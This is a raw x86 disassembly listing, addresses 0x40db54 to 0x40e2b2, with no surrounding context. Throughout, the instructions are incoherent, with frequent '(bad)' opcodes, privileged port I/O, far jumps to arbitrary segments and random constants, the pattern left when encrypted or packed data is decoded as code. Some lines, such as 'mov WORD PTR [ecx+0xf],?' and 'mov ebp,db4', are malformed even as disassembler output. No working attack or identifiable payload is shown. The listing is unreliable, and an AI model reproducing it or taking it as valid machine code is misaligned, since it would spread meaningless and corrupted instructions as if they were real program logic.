  40db54:	and    BYTE PTR [ebx+0x1e],ch
  40db57:	push   ds
  40db58:	inc    edi
  40db59:	bound  ebx,QWORD PTR [eax]
  40db5b:	ds inc esi
  40db5d:	popa   
  40db5e:	stc    
  40db5f:	cwde   
  40db60:	fsubr  st(5),st
  40db62:	jbe    0x40db31
  40db64:	arpl   WORD PTR [edx],cx
  40db66:	pop    ds
  40db67:	pop    ebp
  40db68:	cmp    esp,DWORD PTR [ebx+0x23]
  40db6b:	(bad)  
  40db6c:	mov    ds:0xcbba1e04,eax
  40db71:	or     ecx,ebx
  40db73:	dec    ebx
  40db74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db75:	pop    ebx
  40db76:	aam    0x82
  40db78:	sub    BYTE PTR [esi],dh
  40db7a:	mov    DWORD PTR [esp+edi*2+0x13],ecx
  40db7e:	popf   
  40db7f:	jmp    0x40db17
  40db81:	push   ss
  40db82:	cmp    ch,dl
  40db84:	push   edx
  40db85:	fdivrp st(1),st
  40db87:	mov    dh,0x75
  40db89:	fadd   QWORD PTR [ebx]
  40db8b:	loop   0x40dc01
  40db8d:	pop    eax
  40db8e:	loopne 0x40dbbf
  40db90:	sbb    eax,0xd417423b
  40db95:	imul   ebx,DWORD PTR [di],0xffffffa6
  40db99:	xor    cl,BYTE PTR [esi-0x1b59d3d4]
  40db9f:	xor    BYTE PTR [edi-0x29f26f59],bh
  40dba5:	cmp    eax,0x7852c4b2
  40dbaa:	push   ecx
  40dbab:	outs   dx,BYTE PTR ds:[esi]
  40dbac:	(bad)  
  40dbad:	in     eax,dx
  40dbae:	xchg   edx,eax
  40dbaf:	ins    BYTE PTR es:[edi],dx
  40dbb0:	push   ecx
  40dbb1:	xor    BYTE PTR [eax],cl
  40dbb3:	push   eax
  40dbb4:	pop    es
  40dbb5:	inc    ebx
  40dbb6:	sbb    DWORD PTR [edx+0x4b],ecx
  40dbb9:	(bad)  
  40dbba:	mov    bh,0x32
  40dbbc:	dec    esp
  40dbbd:	mov    eax,0xde6ba9a5
  40dbc2:	sbb    edx,DWORD PTR [ebp-0xfe2beba]
  40dbc8:	mov    ah,0x1f
  40dbca:	xchg   ebx,eax
  40dbcb:	adc    edx,DWORD PTR [eax+0x5ae45b33]
  40dbd1:	adc    al,0x42
  40dbd3:	push   0xfffffff3
  40dbd5:	pop    edx
  40dbd6:	xlat   BYTE PTR ds:[ebx]
  40dbd7:	xor    edx,DWORD PTR [ecx]
  40dbd9:	ds out 0xcd,al
  40dbdc:	mov    dl,0xc4
  40dbde:	fwait
  40dbdf:	scas   eax,DWORD PTR es:[edi]
  40dbe0:	lock icebp 
  40dbe2:	mov    ch,0x2f
  40dbe4:	in     eax,dx
  40dbe5:	idiv   BYTE PTR [ebx+0x27]
  40dbe8:	xchg   edi,eax
  40dbe9:	mov    dl,0xf3
  40dbeb:	into   
  40dbec:	ret    0x37d4
  40dbef:	add    al,BYTE PTR [ecx*2-0x205eeee3]
  40dbf6:	cli    
  40dbf7:	cli    
  40dbf8:	ins    BYTE PTR es:[edi],dx
  40dbf9:	out    0xc4,al
  40dbfb:	arpl   WORD PTR [edi-0x22594c5],si
  40dc01:	cli    
  40dc02:	into   
  40dc03:	outs   dx,DWORD PTR ds:[esi]
  40dc04:	ja     0x40dc69
  40dc06:	sub    DWORD PTR [ebx+ebx*2+0x7f],0x57
  40dc0b:	xor    ebp,DWORD PTR [ebp+0x3599070a]
  40dc11:	bound  ebx,QWORD PTR [eax+edi*1-0x5d64a84]
  40dc18:	loopne 0x40dbfc
  40dc1a:	in     eax,0x8d
  40dc1c:	fistp  QWORD PTR [esi-0x2fea21f9]
  40dc22:	inc    ebx
  40dc23:	add    ah,cl
  40dc25:	jb     0x40dba7
  40dc27:	push   es
  40dc28:	ins    BYTE PTR es:[edi],dx
  40dc29:	ret    
  40dc2a:	or     al,0x6c
  40dc2c:	stos   DWORD PTR es:[edi],eax
  40dc2d:	outs   dx,BYTE PTR ds:[esi]
  40dc2e:	cld    
  40dc2f:	pop    ecx
  40dc30:	das    
  40dc31:	pop    eax
  40dc32:	xchg   ecx,eax
  40dc33:	mov    bh,0x3
  40dc35:	inc    edx
  40dc36:	ret    
  40dc37:	leave  
  40dc38:	push   0x446102a6
  40dc3d:	pop    eax
  40dc3e:	rcr    esi,1
  40dc40:	das    
  40dc41:	arpl   WORD PTR ds:0xc7479db8,ax
  40dc47:	nop
  40dc48:	cmp    al,0x47
  40dc4a:	test   bh,cl
  40dc4c:	stos   DWORD PTR es:[edi],eax
  40dc4d:	adc    al,0x37
  40dc4f:	mov    al,ds:0x12d5e2af
  40dc54:	pop    esp
  40dc55:	or     BYTE PTR [esi],bl
  40dc57:	pop    edi
  40dc58:	out    dx,al
  40dc59:	push   eax
  40dc5a:	scas   eax,DWORD PTR es:[edi]
  40dc5b:	mov    WORD PTR [ecx+0xf],?
  40dc5e:	scas   al,BYTE PTR es:[edi]
  40dc5f:	adc    BYTE PTR [edi+0x62],bl
  40dc62:	sbb    esp,DWORD PTR [edi+0x6d1525eb]
  40dc68:	in     al,0xff
  40dc6a:	mov    ebx,0xdd32ea32
  40dc6f:	xor    bl,BYTE PTR [ebx+0x6a2c387f]
  40dc75:	cmp    eax,0xef2299e3
  40dc7a:	lahf   
  40dc7b:	xor    BYTE PTR [eax+0x6b56540],ah
  40dc81:	jns    0x40dcf4
  40dc83:	jl     0x40dcc0
  40dc85:	sbb    ebx,eax
  40dc87:	bound  eax,QWORD PTR [edi+0x4d0b8e88]
  40dc8d:	(bad)  
  40dc8e:	outs   dx,BYTE PTR ds:[esi]
  40dc8f:	lahf   
  40dc90:	ja     0x40dc6b
  40dc92:	jge    0x40dcc5
  40dc94:	jmp    0x40dcb5
  40dc96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc97:	sub    esi,ebp
  40dc99:	inc    eax
  40dc9a:	jns    0x40dc2a
  40dc9c:	mov    al,ch
  40dc9e:	dec    ecx
  40dc9f:	push   esi
  40dca0:	jmp    0xf90f1200
  40dca5:	xchg   esi,eax
  40dca6:	out    dx,al
  40dca7:	ret    0x17f3
  40dcaa:	xor    al,0xf6
  40dcac:	enter  0xddef,0x5a
  40dcb0:	mov    bl,0x39
  40dcb2:	test   al,0x26
  40dcb4:	(bad)
  40dcb7:	(bad)  
  40dcb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcb9:	mov    dh,0xbe
  40dcbb:	mov    bh,0x53
  40dcbd:	ja     0x40dd2e
  40dcbf:	dec    esp
  40dcc0:	ret    0xc05b
  40dcc3:	int    0x8c
  40dcc5:	aaa    
  40dcc6:	adc    dl,BYTE PTR [ebx+ebx*1-0x33]
  40dcca:	aad    0xf6
  40dccc:	in     al,dx
  40dccd:	xor    BYTE PTR [esi-0x38],ch
  40dcd0:	xchg   ebp,eax
  40dcd1:	leave  
  40dcd2:	mov    ds:0x1421d63c,eax
  40dcd7:	jns    0x40dc9d
  40dcd9:	ins    BYTE PTR es:[edi],dx
  40dcda:	or     ecx,DWORD PTR [ebp+0x2204fcad]
  40dce0:	inc    ebp
  40dce1:	mov    ch,0xf4
  40dce3:	inc    edx
  40dce4:	ss cld 
  40dce6:	adc    al,0x7c
  40dce8:	test   DWORD PTR [edx-0x739f5bbc],edi
  40dcee:	fincstp 
  40dcf0:	ret    
  40dcf1:	push   cs
  40dcf2:	pop    ebx
  40dcf3:	push   ebp
  40dcf4:	lock xchg esp,eax
  40dcf6:	sub    eax,DWORD PTR [esi+0x36]
  40dcf9:	mov    ebx,0x76a39d7
  40dcfe:	scas   eax,DWORD PTR es:[edi]
  40dcff:	ins    BYTE PTR es:[edi],dx
  40dd00:	cmp    BYTE PTR [eax],0x29
  40dd03:	push   esi
  40dd04:	addr16 mov edi,0x11d75755
  40dd0a:	in     eax,0x1e
  40dd0c:	(bad)  
  40dd0d:	imul   ecx,DWORD PTR [esi+eax*8],0xb1d96fa
  40dd14:	bound  edi,QWORD PTR [ebx]
  40dd16:	mov    cl,0x5e
  40dd18:	or     al,0xc2
  40dd1a:	(bad)  
  40dd1b:	jp     0x40dd69
  40dd1d:	add    edi,edi
  40dd1f:	in     al,0xd
  40dd21:	bound  ecx,QWORD PTR [eax+ebx*8+0x3b2f3c6e]
  40dd28:	pop    ebx
  40dd29:	fdiv   QWORD PTR [edx+0x50]
  40dd2c:	sub    BYTE PTR [edx-0x49],dl
  40dd2f:	xchg   esi,eax
  40dd30:	push   ecx
  40dd31:	(bad)
  40dd34:	adc    edi,ebp
  40dd36:	xor    edx,0x24da9f44
  40dd3c:	xchg   esp,eax
  40dd3d:	retf   0x2fda
  40dd40:	add    DWORD PTR [eax-0x62],esp
  40dd43:	loopne 0x40dd63
  40dd45:	imul   ecx,DWORD PTR [ebx],0x3b
  40dd48:	cmp    eax,0x8aeb134a
  40dd4d:	xchg   DWORD PTR [esi-0x74],ecx
  40dd50:	repnz mov al,ds:0xf433fb83
  40dd56:	mov    ebp,0xb53cbc82
  40dd5b:	ret    0xb0b6
  40dd5e:	(bad)  
  40dd5f:	adc    cl,BYTE PTR [eax]
  40dd61:	add    eax,0x466d1267
  40dd66:	lock sbb eax,DWORD PTR fs:[ebx]
  40dd6a:	push   esp
  40dd6b:	test   BYTE PTR [edi+eax*2],0x80
  40dd6f:	jmp    0x659b:0x98a95a50
  40dd76:	and    BYTE PTR [esi-0x6001a805],0x3d
  40dd7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd7e:	mov    edi,0x4bff01ca
  40dd83:	sti    
  40dd84:	jecxz  0x40ddea
  40dd86:	mov    ebx,0xf364e176
  40dd8b:	retf   0xff0a
  40dd8e:	aad    0xd0
  40dd90:	cmp    edi,ecx
  40dd92:	or     ah,BYTE PTR ds:0xd018968c
  40dd98:	bound  esp,QWORD PTR [eax]
  40dd9a:	or     ah,bh
  40dd9c:	jl     0x40ddce
  40dd9e:	xor    DWORD PTR [ebx],0xffffffd5
  40dda1:	dec    ecx
  40dda2:	and    al,BYTE PTR [esi]
  40dda4:	mov    ebp,0xb96c644f
  40dda9:	mov    bl,0x20
  40ddab:	add    al,0xd6
  40ddad:	mov    WORD PTR [ebx],es
  40ddaf:	rol    DWORD PTR [edx],cl
  40ddb1:	je     0x40dd33
  40ddb3:	rcl    DWORD PTR [ecx],0x65
  40ddb6:	pop    esp
  40ddb7:	add    ch,ch
  40ddb9:	out    0x16,eax
  40ddbb:	(bad)  
  40ddbc:	call   0x6b7a:0x11a94b33
  40ddc3:	adc    al,0x59
  40ddc5:	daa    
  40ddc6:	std    
  40ddc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddc8:	arpl   WORD PTR [edi],di
  40ddca:	mov    DWORD PTR [ecx-0x44586e8e],edx
  40ddd0:	out    0xc7,al
  40ddd2:	sbb    edx,esi
  40ddd4:	sub    al,0x2d
  40ddd6:	adc    eax,0x517acbff
  40dddb:	xchg   edi,eax
  40dddc:	imul   esi,DWORD PTR [ebx+0x27],0xffffff8c
  40dde0:	repz pop edx
  40dde2:	mul    BYTE PTR [ebx-0x33]
  40dde5:	adc    DWORD PTR [edx+0xd],0xfffffff0
  40dde9:	pop    edx
  40ddea:	sbb    bh,bh
  40ddec:	push   ss
  40dded:	ficomp DWORD PTR [esi+0x79]
  40ddf0:	cmp    DWORD PTR [edi],esp
  40ddf2:	inc    eax
  40ddf3:	sbb    cl,BYTE PTR ds:0xde951627
  40ddf9:	mov    eax,0x1fdca76b
  40ddfe:	rcr    ebp,cl
  40de00:	sti    
  40de01:	cli    
  40de02:	mov    ah,0x7c
  40de04:	push   edx
  40de05:	out    dx,eax
  40de06:	mov    DWORD PTR cs:[edi+ebp*1-0x1b2bd4f3],esi
  40de0e:	inc    edx
  40de0f:	mov    edx,0x88587d95
  40de14:	sbb    BYTE PTR [ebx+0x1],ch
  40de17:	std    
  40de18:	add    DWORD PTR [edx+0xb463e32],edi
  40de1e:	fist   DWORD PTR [ebx]
  40de20:	call   0x6379:0xdcafb803
  40de27:	test   eax,0x10b8b9db
  40de2c:	js     0x40de8f
  40de2e:	(bad)  
  40de2f:	lds    esp,FWORD PTR [esi+0x1]
  40de32:	mov    ebp,0x21558c75
  40de37:	xchg   esi,eax
  40de38:	mov    eax,ds:0xc7cdc21b
  40de3d:	add    DWORD PTR [ebx-0x51216075],edi
  40de43:	and    edx,esp
  40de45:	cld    
  40de46:	(bad)  
  40de47:	mov    ecx,0x1696f783
  40de4c:	gs out 0x7d,al
  40de4f:	xlat   BYTE PTR ds:[ebx]
  40de50:	jns    0x40dea1
  40de52:	cmp    bl,ch
  40de54:	mov    esi,0x78523b42
  40de59:	add    edi,ecx
  40de5b:	and    eax,0x838a36f8
  40de60:	call   0xd0b2:0x270b84b
  40de67:	retf   0x4d5f
  40de6a:	push   ss
  40de6b:	jecxz  0x40de47
  40de6d:	inc    ecx
  40de6e:	mov    BYTE PTR fs:[esi+edx*1-0x7226acb2],0xda
  40de77:	mov    ds,WORD PTR [eax+0x15d6c0aa]
  40de7d:	or     esi,esp
  40de7f:	(bad)  
  40de80:	fadd   st(0),st
  40de82:	xor    ch,0x2b
  40de85:	pop    ecx
  40de86:	lock imul ah
  40de89:	pop    ebp
  40de8a:	mov    esi,0x4f4607a8
  40de8f:	pop    esp
  40de90:	mov    al,0x42
  40de92:	xchg   ecx,eax
  40de93:	lods   eax,DWORD PTR ds:[esi]
  40de94:	in     eax,0x83
  40de96:	dec    ebp
  40de97:	jns    0x40de57
  40de99:	push   ss
  40de9a:	aad    0x48
  40de9c:	das    
  40de9d:	les    eax,FWORD PTR [ebp+0x1006ac78]
  40dea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dea4:	stos   BYTE PTR es:[edi],al
  40dea5:	(bad)  
  40dea6:	outs   dx,BYTE PTR ds:[esi]
  40dea7:	fistp  QWORD PTR [ebx]
  40dea9:	mov    dl,0x14
  40deab:	push   cs
  40deac:	push   cs
  40dead:	push   ebp
  40deae:	inc    esi
  40deaf:	xchg   ch,ah
  40deb1:	mov    bl,BYTE PTR [ecx+edi*4-0x5f760456]
  40deb8:	addr16 pop edi
  40deba:	cmp    DWORD PTR [esi+0x5],eax
  40debd:	ja     0x40de4d
  40debf:	retf   0xe722
  40dec2:	popa   
  40dec3:	fstp   QWORD PTR [eax+0x73]
  40dec6:	sub    eax,0x27edfa06
  40decb:	call   0x3a66d4db
  40ded0:	mov    esi,0x585e8a3e
  40ded5:	jbe    0x40df3d
  40ded7:	repz add cl,BYTE PTR [esi+0x595eb44c]
  40dede:	mov    ds:0x821a9b86,eax
  40dee3:	and    esi,ebx
  40dee5:	or     ecx,edi
  40dee7:	mov    eax,ds:0x72d70e62
  40deec:	cmc    
  40deed:	xor    eax,0xbf951684
  40def2:	or     edx,DWORD PTR [eax-0x6a]
  40def5:	pop    es
  40def6:	xlat   BYTE PTR ds:[ebx]
  40def7:	cwde   
  40def8:	mov    esi,0x42acd1ab
  40defd:	jp     0x40def0
  40deff:	push   0x3a3566fb
  40df04:	push   ss
  40df05:	jae    0x40df40
  40df07:	(bad)  
  40df09:	or     al,BYTE PTR [eax]
  40df0b:	sbb    eax,0x65fabb31
  40df10:	test   DWORD PTR [esi+0x13],eax
  40df13:	sbb    al,0x32
  40df15:	outs   dx,BYTE PTR ds:[esi]
  40df16:	loopne 0x40df04
  40df18:	or     ecx,DWORD PTR [esp+eax*1+0x1f]
  40df1c:	pop    esp
  40df1d:	cld    
  40df1e:	ins    BYTE PTR es:[edi],dx
  40df1f:	retf   0xde52
  40df22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df23:	fld    QWORD PTR [eax+0x4e]
  40df26:	stc    
  40df27:	push   ebx
  40df28:	dec    esi
  40df29:	adc    BYTE PTR gs:[ebx-0x6f53d955],0xe
  40df31:	hlt    
  40df32:	int3   
  40df33:	add    eax,0xc57797af
  40df38:	ret    0x57a8
  40df3b:	add    BYTE PTR [ebp-0x2a8dc805],al
  40df41:	jnp    0x40df2f
  40df43:	je     0x40dfb5
  40df45:	loope  0x40decb
  40df47:	push   es
  40df48:	fwait
  40df49:	mov    ah,0x6
  40df4b:	sub    eax,0xea9de481
  40df50:	clc    
  40df51:	pop    ecx
  40df52:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40df54:	fstp   DWORD PTR [ebx+0x37]
  40df57:	jecxz  0x40df28
  40df59:	inc    edi
  40df5a:	cwde   
  40df5b:	enter  0xb081,0x28
  40df5f:	sahf   
  40df60:	(bad)  
  40df62:	data16 mov al,ds:0xe7a01814
  40df68:	xchg   DWORD PTR [esi+ebx*4],edi
  40df6b:	and    ebx,ebx
  40df6d:	xchg   DWORD PTR [ebp-0x5d428a66],ebp
  40df73:	xchg   edi,eax
  40df74:	mov    ecx,0x6a2dd166
  40df79:	stc    
  40df7a:	fldenv ds:0x40797efd
  40df80:	xlat   BYTE PTR ds:[ebx]
  40df81:	stos   BYTE PTR es:[edi],al
  40df82:	(bad)  
  40df84:	cld    
  40df85:	pop    ebx
  40df86:	test   eax,0x4c8d8472
  40df8b:	sub    al,0x20
  40df8d:	inc    esi
  40df8e:	mov    BYTE PTR [esi+0x44],ah
  40df91:	lods   eax,DWORD PTR ds:[esi]
  40df92:	lea    eax,[esi-0x73]
  40df95:	shr    DWORD PTR [ebx],1
  40df97:	mov    eax,0x337eadf3
  40df9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df9d:	mov    ds:0x813817d7,eax
  40dfa2:	enter  0xcc28,0xbe
  40dfa6:	pop    edi
  40dfa7:	xor    eax,0x5fa6358a
  40dfac:	popf   
  40dfad:	add    DWORD PTR [eax+0x4d],ecx
  40dfb0:	popf   
  40dfb1:	in     al,dx
  40dfb2:	and    esp,DWORD PTR [edx-0x24]
  40dfb5:	(bad)  
  40dfb6:	jmp    0x40dff3
  40dfb8:	or     DWORD PTR [ecx+eiz*1+0x4ffe6d85],ebx
  40dfbf:	cmp    DWORD PTR [eax],edi
  40dfc1:	mov    al,ds:0x3e8e0299
  40dfc6:	sbb    al,0x9c
  40dfc8:	lahf   
  40dfc9:	dec    ebp
  40dfca:	inc    ebx
  40dfcb:	lds    esi,FWORD PTR [edi+0x10]
  40dfce:	pop    ebp
  40dfcf:	cmp    al,0x3d
  40dfd1:	repz out 0x75,eax
  40dfd4:	adc    ebx,ebp
  40dfd6:	mov    bh,0xb5
  40dfd8:	push   cs
  40dfd9:	lea    ebp,[ecx+0x225665a3]
  40dfdf:	shr    DWORD PTR ds:0x41ec623f,1
  40dfe5:	(bad)  
  40dfe6:	jp     0x40df7e
  40dfe8:	(bad)
  40dfec:	inc    esi
  40dfed:	es in  eax,0x40
  40dff0:	xor    DWORD PTR [edx],ebp
  40dff2:	lock and eax,0x1905b530
  40dff8:	inc    edx
  40dff9:	fcom   DWORD PTR [esi]
  40dffb:	xchg   BYTE PTR [eax+0xadd82cb],bl
  40e001:	cmp    bl,BYTE PTR [esi+0x1a22df98]
  40e007:	test   DWORD PTR [esi],edx
  40e009:	sub    cl,bh
  40e00b:	call   0x847fb689
  40e010:	shl    DWORD PTR [ebx+eiz*1+0x2a],1
  40e014:	mov    eax,0xea2c898e
  40e019:	mov    ecx,0x2f0dab80
  40e01e:	mov    edx,0x26c84aae
  40e023:	sbb    dl,BYTE PTR [ebx]
  40e025:	cmp    ecx,DWORD PTR [ecx]
  40e027:	aam    0xa2
  40e029:	daa    
  40e02a:	outs   dx,BYTE PTR ds:[esi]
  40e02b:	jmp    0xd77ad0a7
  40e030:	(bad)  
  40e031:	icebp  
  40e032:	cmp    eax,0xbefab7dd
  40e037:	sub    edi,ecx
  40e039:	mov    eax,ebx
  40e03b:	ret    0xe61d
  40e03e:	pop    es
  40e03f:	cwde   
  40e040:	imul   edi,DWORD PTR [eax+0x49b107d0],0xb3a4f559
  40e04a:	push   eax
  40e04b:	pusha  
  40e04c:	push   es
  40e04d:	add    edx,DWORD PTR [ebx]
  40e04f:	inc    ecx
  40e050:	inc    ebp
  40e051:	cli    
  40e052:	in     eax,dx
  40e053:	mov    WORD PTR [ebx-0x4],gs
  40e056:	sbb    edx,DWORD PTR [esi-0x63]
  40e059:	daa    
  40e05a:	inc    ebp
  40e05b:	stos   DWORD PTR es:[edi],eax
  40e05c:	inc    esp
  40e05d:	daa    
  40e05e:	popf   
  40e05f:	cmp    edi,DWORD PTR [eax-0x2a]
  40e062:	pop    eax
  40e063:	push   esp
  40e064:	ret    
  40e065:	jl     0x40e0df
  40e067:	pop    ss
  40e068:	mov    esp,0xf2229203
  40e06d:	sbb    esi,0xffffffad
  40e070:	pop    esi
  40e071:	je     0x40e09e
  40e073:	push   0x21
  40e075:	jmp    0xc16e:0x25020a28
  40e07c:	lods   al,BYTE PTR ds:[esi]
  40e07d:	addr16 test eax,0x1903fcbc
  40e083:	inc    eax
  40e084:	push   ecx
  40e085:	mov    ds:0x83d45d0c,al
  40e08a:	pushf  
  40e08b:	push   ds
  40e08c:	adc    BYTE PTR [edx+ecx*1-0x61],dl
  40e090:	xchg   ebx,eax
  40e091:	pop    ecx
  40e092:	ds stos BYTE PTR es:[edi],al
  40e094:	scas   al,BYTE PTR es:[edi]
  40e095:	jp     0x40e03b
  40e097:	popw   ss
  40e099:	jg     0x40e0af
  40e09b:	imul   edx,DWORD PTR [ebp+0x794fdcbf],0x18
  40e0a2:	sbb    ch,BYTE PTR [edx+0x16]
  40e0a5:	inc    esi
  40e0a6:	inc    ebx
  40e0a7:	call   0x9763:0x45a245d
  40e0ae:	mov    dh,BYTE PTR [edx-0x4c]
  40e0b1:	sub    dh,dh
  40e0b3:	pop    esi
  40e0b4:	lahf   
  40e0b5:	sub    DWORD PTR [edx],esi
  40e0b7:	shl    BYTE PTR [esi],cl
  40e0b9:	sbb    BYTE PTR [edx],cl
  40e0bb:	sbb    DWORD PTR es:[ebx-0x2b],edx
  40e0bf:	jae    0x40e0bc
  40e0c1:	xchg   ebx,eax
  40e0c2:	sbb    al,0x74
  40e0c4:	inc    edx
  40e0c5:	mov    eax,ds:0x4bf3c9a4
  40e0ca:	ret    
  40e0cb:	loope  0x40e0fb
  40e0cd:	rcr    esp,0xac
  40e0d0:	jecxz  0x40e121
  40e0d2:	daa    
  40e0d3:	dec    ebp
  40e0d4:	dec    esp
  40e0d5:	out    0x79,al
  40e0d7:	push   edi
  40e0d8:	in     eax,dx
  40e0d9:	jnp    0x40e13e
  40e0db:	jle    0x40e0a5
  40e0dd:	dec    ebp
  40e0df:	fcomip st,st(4)
  40e0e1:	std    
  40e0e2:	je     0x40e0cc
  40e0e4:	inc    esp
  40e0e5:	mov    eax,ds:0x203f4dd5
  40e0ea:	inc    ebx
  40e0eb:	fild   WORD PTR ds:0x87aa23af
  40e0f1:	mov    eax,ds:0x5e2f6cdb
  40e0f6:	and    BYTE PTR [ebx-0x5e5a90e1],cl
  40e0fc:	adc    edx,DWORD PTR [edx]
  40e0fe:	xor    al,BYTE PTR [ecx+eax*4-0x6]
  40e102:	imul   edi,DWORD PTR [ebx],0xb
  40e105:	mov    eax,DWORD PTR [esi+edi*2-0x80]
  40e109:	lock mov dl,0xb
  40e10c:	pop    esi
  40e10d:	mov    ch,0x1b
  40e10f:	scas   al,BYTE PTR es:[edi]
  40e110:	loop   0x40e131
  40e112:	enter  0xe168,0x4d
  40e116:	push   cs
  40e117:	pop    ebx
  40e118:	adc    DWORD PTR [esi+0x17ae0e47],edi
  40e11e:	pop    ds
  40e11f:	(bad)  
  40e121:	pop    esi
  40e122:	xchg   edx,eax
  40e123:	fdiv   DWORD PTR ds:0x7d251754
  40e129:	sar    ebx,1
  40e12b:	in     eax,0x43
  40e12d:	mov    esi,0x4f16b8be
  40e132:	inc    ebx
  40e133:	fdivp  st(1),st
  40e135:	cwde   
  40e136:	dec    edi
  40e137:	std    
  40e138:	mov    ebx,0x27e82a59
  40e13d:	jnp    0x40e1af
  40e13f:	fbld   TBYTE PTR [esi-0x29032280]
  40e145:	enter  0x6545,0x28
  40e149:	mul    BYTE PTR [ebx-0x273ffca3]
  40e14f:	sbb    ecx,ecx
  40e151:	cmp    DWORD PTR [ebx+ebp*1],eax
  40e154:	pushf  
  40e155:	pop    ss
  40e156:	jg     0x40e189
  40e158:	fmul   QWORD PTR [edi]
  40e15a:	aas    
  40e15b:	loopne 0x40e18f
  40e15d:	cmp    dl,BYTE PTR [ebp-0x32]
  40e160:	mov    esp,fs
  40e162:	out    0xaa,al
  40e164:	mov    esp,0x214bcd2
  40e169:	lds    ebx,FWORD PTR [eax*1+0xc03cae2]
  40e170:	cwde   
  40e171:	ret    0xed80
  40e174:	xor    bh,BYTE PTR [ecx+esi*1+0x6d]
  40e178:	xlat   BYTE PTR ds:[ebx]
  40e179:	mov    esi,DWORD PTR [ebp-0x3c]
  40e17c:	push   ecx
  40e17d:	mov    ebp,db4
  40e180:	mov    eax,0x9033865d
  40e185:	or     bl,BYTE PTR [edi+0xc]
  40e188:	or     eax,DWORD PTR [esi-0x12]
  40e18b:	stos   DWORD PTR es:[edi],eax
  40e18c:	jl     0x40e1ad
  40e18e:	ins    BYTE PTR es:[edi],dx
  40e18f:	adc    esi,eax
  40e191:	xor    edx,ebp
  40e193:	out    0xa7,al
  40e195:	or     DWORD PTR [ebx*1+0x56b05226],edi
  40e19c:	aaa    
  40e19d:	fidivr DWORD PTR [edx+0x2cf6f006]
  40e1a3:	sbb    DWORD PTR [ebx-0x27f6d],eax
  40e1a9:	xor    DWORD PTR [esp+ecx*1+0x8],eax
  40e1ad:	aas    
  40e1ae:	or     eax,0x74d001ad
  40e1b3:	hlt    
  40e1b4:	and    edx,esi
  40e1b6:	push   edx
  40e1b7:	adc    bh,bl
  40e1b9:	dec    ebx
  40e1ba:	call   0x3f12:0x3084813f
  40e1c1:	cmp    BYTE PTR [edi+0x5649726f],dh
  40e1c7:	cmp    eax,0x47609327
  40e1cc:	iret   
  40e1cd:	ret    0x9208
  40e1d0:	and    DWORD PTR [esi],edx
  40e1d2:	clc    
  40e1d3:	and    edi,DWORD PTR [edi-0x7]
  40e1d6:	and    al,0x4a
  40e1d8:	lea    edx,[ebx-0x54e141d6]
  40e1de:	repz mov bh,0x88
  40e1e1:	adc    esp,eax
  40e1e3:	pop    edi
  40e1e4:	in     eax,dx
  40e1e5:	sti    
  40e1e6:	xchg   esi,eax
  40e1e7:	inc    esi
  40e1e8:	ret    
  40e1e9:	daa    
  40e1ea:	fstp   TBYTE PTR [ecx+0x1e]
  40e1ed:	(bad)  
  40e1ee:	lods   eax,DWORD PTR ds:[esi]
  40e1ef:	imul   ebp,DWORD PTR [esi-0x4bd7ea44],0xffffffe0
  40e1f6:	out    dx,eax
  40e1f7:	mov    ebp,0x58cf59d7
  40e1fc:	clc    
  40e1fd:	push   edi
  40e1fe:	adc    BYTE PTR [esi-0x3cd3ab15],bh
  40e204:	xchg   edx,eax
  40e205:	cmp    esi,DWORD PTR [ebx-0x72808113]
  40e20b:	(bad)  
  40e20c:	stos   DWORD PTR es:[edi],eax
  40e20d:	daa    
  40e20e:	cmp    ecx,DWORD PTR [edi]
  40e210:	ret    0x91f2
  40e213:	loop   0x40e19c
  40e215:	jo     0x40e1d2
  40e217:	pushf  
  40e218:	mov    ch,0x5d
  40e21a:	stos   DWORD PTR es:[edi],eax
  40e21b:	sub    al,0xd5
  40e21d:	call   edi
  40e21f:	arpl   WORD PTR [esi],ax
  40e221:	push   edx
  40e222:	mov    esp,0x7f6009ec
  40e227:	push   cs
  40e228:	xchg   esi,eax
  40e229:	loopne 0x40e25c
  40e22b:	psrlq  mm7,QWORD PTR [esi+0x4623a7ce]
  40e232:	inc    eax
  40e233:	jbe    0x40e27c
  40e235:	push   edi
  40e236:	fdiv   st(3),st
  40e238:	fwait
  40e239:	adc    eax,0x9856a75c
  40e23e:	into   
  40e23f:	ret    
  40e240:	and    eax,0x870e5fe2
  40e245:	(bad)  
  40e246:	add    bh,ch
  40e248:	fstp   DWORD PTR [eax-0x49]
  40e24b:	das    
  40e24c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40e24e:	in     al,0xbb
  40e250:	add    BYTE PTR [esi+0x6f],al
  40e253:	aam    0xad
  40e255:	nop
  40e256:	xor    esi,ebp
  40e258:	sbb    BYTE PTR [eax-0x65f05ae1],al
  40e25e:	cdq    
  40e25f:	retf   0x6d22
  40e262:	sbb    BYTE PTR [esi+0x682b6484],bh
  40e268:	dec    esp
  40e269:	jge    0x40e2da
  40e26b:	pop    ebx
  40e26c:	sub    eax,0x184790ca
  40e271:	repz mov bh,0xeb
  40e274:	pop    edx
  40e275:	into   
  40e276:	sbb    edi,DWORD PTR [eax]
  40e278:	in     eax,dx
  40e279:	(bad)  
  40e27a:	ss cmp eax,0xb3f9bb52
  40e280:	dec    edi
  40e281:	xor    eax,DWORD PTR gs:[ebx-0x42]
  40e285:	cld    
  40e286:	xor    bl,BYTE PTR [esi+edx*2]
  40e289:	xlat   BYTE PTR ds:[ebx]
  40e28a:	lods   al,BYTE PTR ds:[esi]
  40e28b:	retf   0x5e94
  40e28e:	or     BYTE PTR [ecx-0x37a80e4e],ah
  40e294:	mov    bh,0xb7
  40e296:	enter  0x1a52,0x2b
  40e29a:	push   ebx
  40e29b:	sti    
  40e29c:	cs mov al,0xee
  40e29f:	aad    0xf4
  40e2a1:	int3   
  40e2a2:	mov    ch,0x45
  40e2a4:	or     bh,BYTE PTR [edx-0x431fae63]
  40e2aa:	cli    
  40e2ab:	(bad)  
  40e2ac:	stc    
  40e2ad:	add    esi,ebp
  40e2af:	pop    ds
  40e2b0:	jle    0x40e2d6
  40e2b2:	mov    BYTE PTR [ecx],ah
